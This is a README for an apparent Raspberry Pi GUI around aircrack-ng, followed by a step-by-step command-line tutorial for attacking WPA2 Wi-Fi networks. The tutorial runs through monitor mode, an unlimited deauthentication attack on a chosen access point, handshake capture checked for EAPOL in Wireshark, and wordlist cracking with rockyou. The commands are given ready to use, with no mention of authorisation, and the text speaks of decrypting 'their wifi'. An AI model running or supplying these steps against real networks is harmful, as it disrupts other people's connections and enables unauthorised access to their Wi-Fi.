# Aircrack-Ng-Gui-for-raspberry-pi
gui for the raspberry pi for aircrack ng
-
requirements:
a raspberry pi that can connect to wifi
a wifi adapter
python on your raspberry pi
mouse for raspberry pi
keyboard for raspberry pi
-
steps:
write kali linux to your pi
then plug in your wifi adapter
make sure its connected to your computer or screen or gpio screen i dont care it should be connected to something that displays it
-
<hypothetical steps>
first: kill all processes that might mess up the script with the kill process button
-  
second: connect to wlan0 by clicking the start wlan0
-  
third: scan bssids by using the scan bssid button
-  
fourth: click the list button and select the bssid (you should see the ap name and channel)
-  
fifth: click the deauth button to deauth the selected ap
-  
-
(if you want to decrypt their wifi:)
  -
one step before deauthing run the createfile script then set the name
  -
it should create a file for the cap with the name you made so then you should run the cap create button
  
then click the ls button
  
the file name should be the filename you set it as so then click the wireshark name button
  
type in the name (eg: test-01.cap) (make sure to include the -01.cap after the name if thats what pops up when you click ls)
  
then click the wiresharkcheck button and a wireshark window should popup
  
  when the window pops up click the top of it to search for something and type this in: eapol
  
  you should see files pop up, if none do then retry these steps. if still nothing pops up then its not my problem
  
then click the stop wlan0 button
  
then click the crack wpa2 name button
  
  then type in the same thing you typed in for the wiresharkcheck button (eg: if you typed in test-01.cap then type in the same thing)
  
  make sure you have Rock you or another wordlist
  
  Make sure you have rockyou in text format (unzip file on Kali) look up how to unzip rockyou on kali
  
  if you want to change the wordlist just type in the file location in the script
  
then run the crack wifi password button and wait.
 - 
  -
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
  here is a modified tutorial if you want to run it without a raspberry pi, only a kali linux laptop and wifi adapter:
-
-
-
==============================================================================================
See interfaces:
-
ip addr
iwconfig
-
==============================================================================================
-
-
kill processes:
-
sudo airmon-ng check kill
-
-
==============================================================================================
-
Start monitor mode:
-
sudo airmon-ng start wlan0
==============================================================================================
-
-
==============================================================================================
Verify that monitor mode is used:
-
sudo airmon-ng 
==============================================================================================
-
-
==============================================================================================
You could also use iwconfig to check that interface is in monitor mode:
-
iwconfig
==============================================================================================
-
==============================================================================================
Get the AP's MAC address and channel:
sudo airodump-ng wlan0
==============================================================================================
-
-
==============================================================================================
! AP-MAC & channel - you need to select your own here:
ESSID: <essid>
Channel used by AP for SSID: <channel>
==============================================================================================
-
1st Window:
!Make sure you replace the channel number and bssid with your own
!Replace hack1 with your file name like capture1 or something 
sudo airodump-ng -w <filename> -c <replace with channel> --bssid <bssid> wlan0
-
==============================================================================================
-
==============================================================================================
-
2nd Window - deauth attack:
!Make sure you replace the bssid with your own
sudo aireplay-ng --deauth 0 -a <bssid> wlan0
  type in ctrl c after you captured the handshake
-
==============================================================================================
-
-
==============================================================================================
Use Wireshark to open hack file:
-
type in ls
then the file name that you typed in should be there:
-
wireshark <filename>.cap
-
Filter Wireshark messages for EAPOL (look it up in the wireshark search thing
eapol
==============================================================================================
-
==============================================================================================
!Stop monitor mode
airmon-ng stop wlan0mon
==============================================================================================
-
==============================================================================================
Crack file with Rock you or another wordlist
Make sure you have rockyou in text format (unzip file on Kali)
Replace hack1-01.cap with your file name
aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt 
==============================================================================================

  
  
  
